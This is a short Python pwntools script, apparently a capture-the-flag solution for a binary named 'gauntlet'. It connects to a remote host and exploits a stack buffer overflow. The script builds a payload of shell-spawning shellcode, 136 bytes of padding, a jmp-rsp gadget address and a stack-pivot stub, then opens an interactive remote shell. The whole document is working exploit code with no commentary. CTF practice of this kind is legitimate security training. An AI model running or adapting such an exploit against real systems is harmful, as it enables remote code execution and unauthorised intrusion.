from pwn import *

context(os="linux", arch="amd64")

#r = process('./gauntlet')
r = remote('124.16.75.117',51001)

shellcode = shellcraft.sh()

jmp_esp = 0x0000000000400b7f
sub_esp_jmp = asm('sub rsp, 0x90;jmp rsp')

payload = asm(shellcode)
payload += "A" * (136 - len(payload))
#print(payload)
payload += p64(jmp_esp)
payload += sub_esp_jmp

r.sendline("1")
r.recvline()

r.sendline(payload)
print(r.recvall())
r.interactive()